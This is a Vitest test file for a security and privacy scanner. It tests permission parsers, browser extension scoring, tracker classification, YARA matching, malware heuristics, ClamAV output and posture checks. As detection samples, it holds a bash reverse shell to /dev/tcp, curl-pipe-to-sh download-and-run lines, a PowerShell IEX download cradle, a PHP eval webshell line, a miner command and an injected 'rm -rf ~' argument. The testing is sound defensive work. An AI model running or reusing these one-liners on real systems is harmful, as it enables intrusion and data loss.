// SPDX-License-Identifier: LicenseRef-PolyForm-Shield-1.0.0
import { describe, expect, it } from 'vitest';
import { byService, fileTimeToMs, parseConsentStoreGrants, parseFlatpakPermissions, parseFlatpakStatic, parsePwDump, parseTcc, tccutilArgs } from '../core/security/permissions';
import { chromiumExtension, firefoxDoh, parseChromiumLocalState, parseChromiumPreferences, parseFirefoxExtensions, parseFirefoxProfilesIni, scoreExtension } from '../core/security/browsers';
import { appPrivacy, classifyHost, exposedListeners, parseDisconnect, parseDomainList, trackerIndex } from '../core/security/trackers';
import { matchYara, parseYara } from '../core/security/yara';
import { autoQuarantine, disguisedName, EICAR, hasMacros, inspect, macroRedFlags, persistenceCommand, scriptRedFlags, sniff, suspiciousProcess } from '../core/security/heuristics';
import { clamscanArgs, freshclamArgs, parseClamOutput, parseClamVersion } from '../core/security/clamav';
import { countInRange, passwordPrefix } from '../core/security/hibp';
import { open, seal, sha256 } from '../core/security/quarantine';
import { decodeMessages, encodeMessage, hostManifest, hostManifestLocations } from '../core/security/nativemsg';
import { linuxPosture, macAddedRoots, macAutoLogin, macScreenLock, macSharing, macWifi, protectionFindings, windowsPosture, wifiFinding } from '../core/security/posture';
import { browserFindings, connectionFindings, malwareFindings, normalizeFindings, permissionFindings, persistenceFindings, reportText, score, topActions } from '../core/security/score';
import { randomBytes } from 'node:crypto';

describe('who can watch what', () => {
  it('reads macOS TCC rows (allowed, denied, limited) with times', () => {
    const g = parseTcc('kTCCServiceCamera|us.zoom.xos|0|2|1730000000\nkTCCServiceMicrophone|com.evil.app|0|0|1720000000\nkTCCServiceScreenCapture|/usr/local/bin/rec|1|2|0\nkTCCServicePhotos|com.apple.Preview|0|3|1700000000\nnot a row');
    expect(g).toHaveLength(4);
    expect(g[0]).toMatchObject({ app: 'us.zoom.xos', service: 'camera', allowed: true, lastUsed: 1730000000000, source: 'tcc' });
    expect(g[1].allowed).toBe(false);
    expect(g[2]).toMatchObject({ service: 'screen', path: '/usr/local/bin/rec', lastUsed: undefined });
    expect(g[3].allowed).toBe(true);
  });
  it('builds tccutil reset arguments only for safe values', () => {
    expect(tccutilArgs('kTCCServiceCamera', 'us.zoom.xos')).toEqual(['reset', 'Camera', 'us.zoom.xos']);
    expect(tccutilArgs('kTCCServiceCamera', 'x; rm -rf ~')).toBeNull();
  });
  it('reads the Windows consent store: desktop and Store apps, last used, in use now', () => {
    const text = [
      'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam',
      '    Value    REG_SZ    Allow',
      'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged',
      'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Program Files#Zoom#bin#Zoom.exe',
      '    LastUsedTimeStart    REG_QWORD    0x1db2a3c4d5e6f70',
      '    LastUsedTimeStop    REG_QWORD    0x0',
      'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe',
      '    Value    REG_SZ    Deny',
      '    LastUsedTimeStart    REG_QWORD    0x1d9000000000000',
      '    LastUsedTimeStop    REG_QWORD    0x1d9000000100000',
    ].join('\r\n');
    const g = parseConsentStoreGrants(text);
    expect(g).toHaveLength(2);
    expect(g[0]).toMatchObject({ app: 'Zoom', path: 'C:\\Program Files\\Zoom\\bin\\Zoom.exe', service: 'camera', allowed: true, inUse: true });
    expect(g[0].lastUsed).toBeGreaterThan(Date.UTC(2020, 0, 1));
    expect(g[1]).toMatchObject({ app: 'Microsoft.WindowsSoundRecorder', service: 'microphone', allowed: false, inUse: false });
    expect(fileTimeToMs(116444736000000000n)).toBe(0);
  });
  it('reads Flatpak permissions and broad manifest rights', () => {
    const g = parseFlatpakPermissions('Table\tObject\tApp\tPermissions\tData\ndevices\tcamera\tcom.slack.Slack\tyes\t0x00\nlocation\tlocation\torg.gnome.Maps\tEXACT,1700000000\t0x00\nscreenshot\tscreenshot\tcom.example.Bad\tno\t0x00\n');
    expect(g.map((x) => [x.app, x.service, x.allowed])).toEqual([['com.slack.Slack', 'camera', true], ['org.gnome.Maps', 'location', true], ['com.example.Bad', 'screen', false]]);
    const s = parseFlatpakStatic('org.chromium.Chromium', '[Context]\nshared=network;ipc;\nsockets=x11;wayland;pulseaudio;\ndevices=all;\nfilesystems=home;xdg-download;\n');
    expect(s.map((x) => x.service).sort()).toEqual(['camera', 'files', 'microphone']);
  });
  it('reads PipeWire capture streams that are running', () => {
    const g = parsePwDump(JSON.stringify([
      { type: 'PipeWire:Interface:Node', info: { state: 'running', props: { 'media.class': 'Stream/Input/Audio', 'application.name': 'Firefox' } } },
      { type: 'PipeWire:Interface:Node', info: { state: 'suspended', props: { 'media.class': 'Stream/Input/Video', 'application.name': 'Cheese' } } },
      { type: 'PipeWire:Interface:Node', info: { state: 'running', props: { 'media.class': 'Audio/Sink' } } },
    ]));
    expect(g.map((x) => [x.app, x.service, x.inUse])).toEqual([['Firefox', 'microphone', true], ['Cheese', 'camera', false]]);
    expect(parsePwDump('nope')).toEqual([]);
  });
  it('groups by service with the sensitive ones first', () => {
    const groups = byService(parseTcc('kTCCServicePhotos|a|0|2|1\nkTCCServiceScreenCapture|b|0|2|2\nkTCCServiceScreenCapture|c|0|0|3'));
    expect(groups[0].service).toBe('screen');
    expect(groups[0].allowed.map((g) => g.app)).toEqual(['b']);
    expect(groups[0].denied.map((g) => g.app)).toEqual(['c']);
  });
});

describe('browsers', () => {
  it('scores extension risk with plain reasons', () => {
    const s = scoreExtension({ id: 'x', permissions: ['cookies', 'webRequest', 'nativeMessaging'], hostPermissions: ['<all_urls>'], fromStore: false });
    expect(s.risk).toBeGreaterThanOrEqual(80);
    expect(s.reasons[0]).toMatch(/every website/);
    expect(scoreExtension({ id: 'y', permissions: ['storage'], hostPermissions: [] }).risk).toBe(0);
    expect(scoreExtension({ id: 'bad', permissions: [], hostPermissions: [] }, { bad: 'stole sessions (2026 report)' })).toMatchObject({ risk: 100, knownBad: 'stole sessions (2026 report)' });
  });
  it('reads Chromium Local State, Preferences and manifests', () => {
    const ls = parseChromiumLocalState(JSON.stringify({ profile: { info_cache: { Default: { name: 'Person 1' }, 'Profile 2': { name: 'Work' } } }, dns_over_https: { mode: 'off' } }));
    expect(ls.profiles).toEqual([{ dir: 'Default', name: 'Person 1' }, { dir: 'Profile 2', name: 'Work' }]);
    expect(ls.doh).toBe('off');
    const prefs = parseChromiumPreferences(JSON.stringify({ account_info: [{ email: 'a@b' }], extensions: { settings: { abc: { state: 1, from_webstore: true, location: 1 }, comp: { location: 5, manifest: { name: 'Built in' } } } } }));
    expect(prefs.signedIn).toBe(true);
    const e = chromiumExtension('abc', JSON.stringify({ name: 'Coupon Helper', version: '2.1', manifest_version: 3, permissions: ['cookies', 'tabs'], host_permissions: ['*://*/*'] }), prefs.settings.abc);
    expect(e).toMatchObject({ name: 'Coupon Helper', enabled: true, fromStore: true });
    expect(e!.risk).toBeGreaterThanOrEqual(50);
    expect(chromiumExtension('comp', undefined, prefs.settings.comp)).toBeNull();
  });
  it('reads Firefox profiles, extensions and DNS over HTTPS', () => {
    expect(parseFirefoxProfilesIni('[General]\nStartWithLastProfile=1\n\n[Profile0]\nName=default-release\nIsRelative=1\nPath=abcd.default-release\n\n[Install4F96]\nDefault=abcd\n')).toEqual([{ name: 'default-release', path: 'abcd.default-release', relative: true }]);
    const ext = parseFirefoxExtensions(JSON.stringify({ addons: [
      { id: 'ublock@x', type: 'extension', location: 'app-profile', version: '1', active: true, defaultLocale: { name: 'uBlock' }, userPermissions: { permissions: ['webRequest', 'webRequestBlocking'], origins: ['<all_urls>'] }, signedState: 2 },
      { id: 'sys@mozilla', type: 'extension', location: 'app-system-defaults', active: true },
      { id: 'theme', type: 'theme', active: true },
    ] }));
    expect(ext).toHaveLength(1);
    expect(ext[0]).toMatchObject({ name: 'uBlock', enabled: true, fromStore: true });
    expect(firefoxDoh('user_pref("network.trr.mode", 3);')).toBe('secure');
    expect(firefoxDoh('user_pref("network.trr.mode", 5);')).toBe('off');
    expect(firefoxDoh('')).toBeUndefined();
  });
});

describe('trackers and connections', () => {
  const idx = trackerIndex(parseDisconnect(JSON.stringify({ categories: { Advertising: [{ AdCo: { 'https://adco.example': ['adco.example', 'adco-cdn.example'] } }], Content: [{ Cdn: { 'https://c.example': ['cdn.example'] } }] } })));
  it('classifies hosts by domain suffix, built-in and from Disconnect', () => {
    expect(classifyHost('www.google-analytics.com', idx)).toMatchObject({ owner: 'Google Analytics', category: 'analytics' });
    expect(classifyHost('img.adco-cdn.example', idx)).toMatchObject({ owner: 'AdCo', category: 'advertising' });
    expect(classifyHost('cdn.example', idx)).toBeUndefined();
    expect(classifyHost('example.org', idx)).toBeUndefined();
    expect(parseDomainList('# list\n0.0.0.0 tracker.example\n||px.example^\nbad line here!\n', 'analytics')).toEqual({ 'tracker.example': ['analytics', 'List'], 'px.example': ['analytics', 'List'] });
  });
  it('summarises per app: trackers, cleartext, countries; and listeners open to the network', () => {
    const a = appPrivacy([
      { app: 'Chrome', remote: '1.1.1.1', host: 'stats.g.doubleclick.net', remotePort: 443, country: 'US', scope: 'internet', bytesOut: 10 },
      { app: 'Chrome', remote: '2.2.2.2', host: 'connect.facebook.net', remotePort: 443, country: 'IE', scope: 'internet' },
      { app: 'OldApp', remote: '3.3.3.3', host: 'update.oldapp.example', remotePort: 80, scope: 'internet' },
      { app: 'Printer', remote: '192.168.1.5', remotePort: 80, scope: 'lan' },
    ], idx);
    expect(a[0]).toMatchObject({ app: 'Chrome', destinations: 2, countries: ['US', 'IE'] });
    expect(a[0].trackers.map((t) => t.owner)).toEqual(['Google Ads', 'Facebook']);
    expect(a.find((x) => x.app === 'OldApp')!.cleartext).toEqual([{ host: 'update.oldapp.example', port: 80, protocol: 'HTTP' }]);
    expect(a.find((x) => x.app === 'Printer')!.cleartext).toEqual([]);
    expect(exposedListeners([{ app: 'sshd', scope: 'listening', localPort: 22, local: '0.0.0.0' }, { app: 'db', scope: 'listening', localPort: 5432, local: '127.0.0.1' }])).toEqual([{ app: 'sshd', port: 22, address: '0.0.0.0' }]);
  });
});

describe('YARA subset', () => {
  const src = `
import "pe"
rule Mz_Downloader : downloader {
  meta: author = "test" description = "MZ with a download string"
  strings:
    $mz = { 4D 5A }
    $a = "URLDownloadToFile" nocase
    $b = "cmd.exe" wide
    $h = { 68 74 74 70 [0-3] 3A 2F 2F }
  condition: uint16(0) == 0x5A4D and ($a or $b) and filesize < 1MB
}
rule Two_Of : x {
  strings: $x1 = "alpha" $x2 = "beta" $x3 = /gam+a/i
  condition: 2 of ($x*)
}
rule Uses_Pe { condition: pe.number_of_sections > 2 }
rule Counted { strings: $c = "ab" condition: #c >= 3 and $c at 0 }
rule Not_Rule { condition: not Two_Of }
`;
  const { rules, skipped } = parseYara(src);
  it('parses rules, skipping module ones with a reason', () => {
    expect(rules.map((r) => r.name)).toEqual(['Mz_Downloader', 'Two_Of', 'Counted', 'Not_Rule']);
    expect(skipped).toEqual([{ name: 'Uses_Pe', reason: 'uses a module or a for-loop' }]);
    expect(rules[0].meta.author).toBe('test');
    expect(rules[0].tags).toEqual(['downloader']);
  });
  it('matches text (nocase, wide), hex with jumps, regexes, counts, offsets and rule references', () => {
    const wide = Buffer.from('cmd.exe', 'utf16le');
    const pe = Buffer.concat([Buffer.from('MZ\x90\x00', 'latin1'), wide, Buffer.from(' urldownloadtofile http://x', 'latin1')]);
    expect(matchYara(rules, pe).map((m) => m.rule)).toEqual(['Mz_Downloader', 'Not_Rule']);
    expect(matchYara(rules, Buffer.from('ababab alpha GAMMMA')).map((m) => m.rule)).toEqual(['Two_Of', 'Counted']);
    expect(matchYara(rules, Buffer.from('nothing here')).map((m) => m.rule)).toEqual(['Not_Rule']);
  });
});

describe('heuristics', () => {
  it('detects the EICAR test file by content and fingerprint, as harmless', () => {
    const d = inspect({ name: 'eicar.com', data: Buffer.from(EICAR) }, sha256(Buffer.from(EICAR)));
    expect(d).toHaveLength(1);
    expect(d[0]).toMatchObject({ name: 'Eicar-Test-Signature', severity: 'low', confidence: 'certain' });
    expect(autoQuarantine(d[0])).toBe(true);
    expect(autoQuarantine({ confidence: 'possible', severity: 'high', name: 'x' })).toBe(false);
  });
  it('sniffs file types and finds disguised names', () => {
    expect(sniff(Buffer.from('MZ\x90'), 'a.pdf')).toBe('pe');
    expect(sniff(Buffer.from([0x7f, 0x45, 0x4c, 0x46]), 'x')).toBe('elf');
    expect(sniff(Buffer.from([0xcf, 0xfa, 0xed, 0xfe]), 'x')).toBe('macho');
    expect(sniff(Buffer.from('#!/bin/sh'), 'x')).toBe('script');
    expect(disguisedName('invoice.pdf.exe', 'pe')).toMatch(/named like a PDF/);
    expect(disguisedName('photo\u202egpj.exe', 'pe')).toMatch(/invisible characters/);
    expect(disguisedName('report.pdf', 'pe')).toMatch(/really a program/);
    expect(disguisedName('report.pdf', 'pdf')).toBeUndefined();
  });
  it('finds macros and their red flags', () => {
    const docm = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from('word/vbaProject.bin Sub AutoOpen() Shell("powershell -c x") URLDownloadToFile')]);
    expect(hasMacros(docm, 'zip')).toBe(true);
    expect(macroRedFlags(docm)).toHaveLength(4);
    const d = inspect({ name: 'invoice.docm', data: docm });
    expect(d[0]).toMatchObject({ name: 'Keeper.Heuristic.Macro.Suspicious', severity: 'high' });
  });
  it('flags scripts that download-and-run, open reverse shells or persist', () => {
    expect(scriptRedFlags('curl -fsSL https://x.example/i.sh | sh').map((x) => x.severity)).toEqual(['high']);
    expect(scriptRedFlags('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')[0].severity).toBe('critical');
    expect(scriptRedFlags('powershell -enc ' + 'A'.repeat(60))[0].why).toMatch(/encoded/);
    expect(scriptRedFlags('echo hello world')).toEqual([]);
    const d = inspect({ name: 'setup.sh', data: Buffer.from('#!/bin/sh\ncurl http://x | sh\nlaunchctl load ~/Library/LaunchAgents/x.plist') });
    expect(d[0]).toMatchObject({ engine: 'heuristic', name: 'Keeper.Heuristic.Script', confidence: 'likely' });
  });
  it('spots miner-like processes and reads persistence commands', () => {
    expect(suspiciousProcess({ name: 'kworkerds', command: './x -o stratum+tcp://pool:3333 --donate-level 1' })).toMatch(/miner/);
    expect(suspiciousProcess({ name: 'node', command: 'node app.js' })).toBeUndefined();
    expect(persistenceCommand('a.plist', '<key>ProgramArguments</key><array><string>/tmp/x</string><string>-d</string></array>')).toBe('/tmp/x -d');
    expect(persistenceCommand('a.service', '[Service]\nExecStart=/home/u/.x/run --q\n')).toBe('/home/u/.x/run --q');
    expect(persistenceCommand('a.desktop', '[Desktop Entry]\nExec=/opt/x %U\n')).toBe('/opt/x %U');
  });
});

describe('ClamAV', () => {
  it('builds scan and update arguments, refusing option-like paths', () => {
    const a = clamscanArgs(['/home/u/Downloads', '--remove'], { database: '/db', maxFileMb: 100 });
    expect(a).toContain('--database=/db');
    expect(a).toContain('--max-filesize=100M');
    expect(a.slice(-2)).toEqual(['--', '/home/u/Downloads']);
    expect(clamscanArgs(['/x'], { daemon: true })).toEqual(['--no-summary', '--infected', '--fdpass', '--multiscan', '--stdout', '/x']);
    expect(freshclamArgs('/db')).toContain('--datadir=/db');
  });
  it('parses detections and versions', () => {
    const d = parseClamOutput('/home/u/eicar.com: Win.Test.EICAR_HDB-1 FOUND\n/home/u/x.exe: PUA.Win.Adware.X FOUND\n/home/u/t.js: Js.Trojan.Agent-1 FOUND\nnoise');
    expect(d.map((x) => [x.path, x.severity, x.confidence])).toEqual([['/home/u/eicar.com', 'low', 'certain'], ['/home/u/x.exe', 'medium', 'likely'], ['/home/u/t.js', 'high', 'certain']]);
    expect(parseClamVersion('ClamAV 1.4.1/27450/Mon Oct 28 08:35:00 2026')).toMatchObject({ engine: '1.4.1', signatures: 27450 });
    expect(parseClamVersion('ClamAV 1.4.1')).toEqual({ engine: '1.4.1', signatures: undefined, date: undefined });
  });
});

describe('leaked passwords (k-anonymity)', () => {
  it('sends only the first five characters of the hash', () => {
    const { prefix, suffix } = passwordPrefix('password');
    expect(prefix).toBe('5BAA6');
    expect(suffix).toBe('1E4C9B93F3F0682250B6CF8331B7EE68FD8');
    expect(countInRange('003D68EB55068C33ACE09247EE4C639306B:3\r\n1E4C9B93F3F0682250B6CF8331B7EE68FD8:10434004\r\n', suffix)).toBe(10434004);
    expect(countInRange('ABC:1', suffix)).toBe(0);
  });
});

describe('quarantine', () => {
  it('encrypts and restores byte for byte; refuses tampering and wrong keys', () => {
    const key = randomBytes(32);
    const data = randomBytes(5000);
    const s = seal(data, key);
    expect(s.includes(data.subarray(0, 64))).toBe(false);
    expect(open(s, key).equals(data)).toBe(true);
    const t = Buffer.from(s);
    t[100] ^= 1;
    expect(() => open(t, key)).toThrow();
    expect(() => open(s, randomBytes(32))).toThrow();
  });
});

describe('browser native messaging', () => {
  it('frames messages and keeps partial ones for later', () => {
    const a = encodeMessage({ site: 'news.example', thirdParties: [] });
    const b = encodeMessage({ ping: 1 });
    const r = decodeMessages(Buffer.concat([a, b.subarray(0, 5)]));
    expect(r.messages).toEqual([{ site: 'news.example', thirdParties: [] }]);
    expect(r.rest.length).toBe(5);
    const big = Buffer.alloc(4);
    big.writeUInt32LE(2 * 1024 * 1024, 0);
    expect(() => decodeMessages(big)).toThrow(/too large/);
  });
  it('writes host manifests where each browser looks', () => {
    expect(hostManifest('/opt/keeper/host', 'chromium', [])).toMatchObject({ name: 'org.ashforde.keeper', type: 'stdio', allowed_origins: ['chrome-extension://lkgnaaiefeiflokcnjnpmocahliakgac/'] });
    expect(hostManifest('/x', 'firefox', [])).toMatchObject({ allowed_extensions: ['privacy@keeper.ashforde.org'] });
    expect(hostManifestLocations('linux', '/home/u').find((l) => l.browser === 'Firefox')!.dir).toBe('/home/u/.mozilla/native-messaging-hosts');
    expect(hostManifestLocations('win32', 'C:\\Users\\u')[0].regKey).toMatch(/^HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\/);
  });
});

describe('posture checks', () => {
  it('macOS: auto-login, screen lock, sharing, Wi-Fi, added certificates', () => {
    expect(macAutoLogin('ana\n', true)[0].severity).toBe('high');
    expect(macAutoLogin('', false)).toEqual([]);
    expect(macScreenLock('screenLock is off')[0].id).toBe('posture.screenlock');
    expect(macScreenLock('screenLock delay is immediate')).toEqual([]);
    expect(macSharing('-\t0\tcom.openssh.sshd\n123\t0\tcom.apple.screensharing\n').map((f) => f.title)).toEqual(['Remote Login (SSH) is on', 'Screen Sharing is on']);
    expect(macWifi(JSON.stringify({ SPAirPortDataType: [{ spairport_airport_interfaces: [{ spairport_current_network_information: { _name: 'Cafe', spairport_security_mode: 'spairport_security_mode_none' } }] }] }))[0].title).toMatch(/open Wi-Fi/);
    expect(macAddedRoots('    "labl"<blob>="Corp Inspection CA"\n    "labl"<blob>="com.apple.systemdefault"\n')[0].detail).toBe('Corp Inspection CA');
  });
  it('Windows and Linux posture from collected values', () => {
    const w = windowsPosture({ autoLogon: '1', rdp: 0, admin: true, telemetry: 3, screenSaverSecure: 0, shares: ['ADMIN$', 'C$', 'IPC$', 'Photos'], wifiAuth: 'WPA2-Personal', recentRoots: ['Fiddler Root'] });
    expect(w.map((f) => f.id)).toEqual(['posture.autologin', 'posture.sharing.rdp', 'posture.admin', 'posture.telemetry', 'posture.screenlock', 'posture.sharing.smb', 'posture.roots']);
    const l = linuxPosture({ sshActive: true, lockEnabled: 'false\n', wifi: { ssid: 'Hotel', security: '' }, tainted: 4096, localCerts: ['mitm.crt'] });
    expect(l.map((f) => f.id)).toEqual(['posture.sharing.ssh', 'posture.screenlock', 'posture.wifi', 'posture.roots', 'posture.kext']);
    expect(wifiFinding('Old', 'WEP')[0].severity).toBe('high');
    expect(wifiFinding('Home', 'WPA3')).toEqual([]);
    expect(protectionFindings([{ id: 'firewall', name: 'Firewall', description: 'Blocks.', status: 'off', weight: 2, fix: 'Turn on' }, { id: 'sip', name: 'SIP', description: 'x', status: 'ok', weight: 3 }])).toEqual([expect.objectContaining({ id: 'protection.firewall', severity: 'medium' })]);
  });
});

describe('findings, score and report', () => {
  it('builds findings from each area and scores them, ignoring ignored ones', () => {
    const findings = [
      ...permissionFindings(parseTcc('kTCCServiceScreenCapture|a|0|2|1\nkTCCServiceListenEvent|b|0|2|1')),
      ...browserFindings([{ browser: 'Chrome', engine: 'chromium', profile: 'Default', path: '/p', savedPasswords: true, doh: 'off', extensions: [{ id: 'e', name: 'Spy', enabled: true, permissions: [], hostPermissions: [], risk: 70, reasons: ['can read and change every website you visit'] }] }]),
      ...connectionFindings([{ app: 'OldApp', destinations: 1, countries: [], trackers: [], cleartext: [{ host: 'h', port: 80, protocol: 'HTTP' }], bytesOut: 0 }], [{ app: 'sshd', port: 22, address: '0.0.0.0' }]),
      ...malwareFindings({ active: [], realtime: false, engines: { clamav: { installed: false } } }),
      ...persistenceFindings([{ id: 'systemd-user:x', kind: 'systemd-user', name: 'x.service', location: '/h/.config/systemd/user/x.service', signed: false, firstSeen: 1 }], new Set()),
    ];
    const ids = findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining(['perm.screen', 'perm.input', 'browser.ext.Chrome.e', 'browser.doh.Chrome.Default', 'conn.clear.OldApp', 'conn.listen', 'mal.realtime', 'mal.clamav', 'mal.scan', 'persist.systemd-user:x']));
    const s = score(findings);
    expect(s).toBeLessThan(80);
    expect(score(findings.map((f) => ({ ...f, ignored: true })))).toBe(100);
    expect(topActions(findings)[0].id).toBe('browser.ext.Chrome.e');
    const n = normalizeFindings(findings);
    expect(n.find((f) => f.id === 'mal.realtime')!.fix!.kind).toBe('auto');
    expect(n.find((f) => f.id === 'browser.ext.Chrome.e')!.fix!.kind).toBe('keeper-page');
    expect(n.every((f) => f.verify)).toBe(true);
    const r = reportText({ score: s, findings, at: 0, host: 'test' });
    expect(r).toMatch(/Score: \d+\/100/);
    expect(r).toMatch(/No security tool can promise to catch everything/);
  });
});

describe('built-in YARA rules', () => {
  it('all parse, and each catches its sample without firing on ordinary text', async () => {
    const { BUILTIN_RULES } = await import('../core/security/rules');
    const { rules, skipped } = parseYara(BUILTIN_RULES);
    expect(skipped).toEqual([]);
    expect(rules).toHaveLength(5);
    const hit = (s: string) => matchYara(rules, Buffer.from(s, 'latin1')).map((m) => m.rule);
    expect(hit('$c = New-Object Net.WebClient; IEX $c.DownloadString("http://x/p.ps1")')).toEqual(['Keeper_PowerShell_Download_Cradle']);
    expect(hit('<?php eval(base64_decode($_POST["x"])); ?>')).toEqual(['Keeper_PHP_Webshell']);
    expect(hit('./xmrig -o stratum+tcp://pool.example:3333 --donate-level 1')).toEqual(['Keeper_Coin_Miner']);
    expect(hit('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')).toEqual(['Keeper_Reverse_Shell']);
    expect(hit('PK\x03\x04 word/vbaProject.bin Sub AutoOpen() URLDownloadToFile')).toEqual(['Keeper_Office_AutoExec_Downloader']);
    expect(hit('Dear team, the quarterly report is attached. Regards, Ana')).toEqual([]);
  });
});

describe('guided fixes', () => {
  it('maps findings onto the shared guide: auto, settings page from the catalogue, Keeper page, or steps', async () => {
    const { toGuide } = await import('../electron/services/security/guide-bridge');
    const base = { area: 'malware' as const, severity: 'medium' as const, title: 't', why: 'w' };
    expect(toGuide({ ...base, id: 'mal.realtime', fix: { label: 'Turn it on', action: 'realtime-on' } })!.fix).toEqual({ kind: 'auto', action: 'security.realtime-on', label: 'Turn it on', needsAdmin: false });
    expect(toGuide({ ...base, id: 'posture.sharing.ssh', area: 'posture', fix: { label: 'Open Sharing settings', settings: 'x' } })!.fix).toMatchObject({ kind: 'open', link: 'sharing' });
    expect(toGuide({ ...base, id: 'browser.ext.Chrome.x', area: 'browsers', fix: { label: 'Open', action: 'open-extensions' } })!.fix).toMatchObject({ kind: 'page', route: { name: 'protection', arg: 'browsers' } });
    expect(toGuide({ ...base, id: 'protection.firewall', area: 'posture' })).toBeNull();
    expect(toGuide({ ...base, id: 'x', severity: 'info' })).toBeNull();
    expect(toGuide({ ...base, id: 'conn.clear.App', area: 'connections' })).toMatchObject({ id: 'security:conn.clear.App', area: 'privacy', fix: { kind: 'page' } });
  });
});
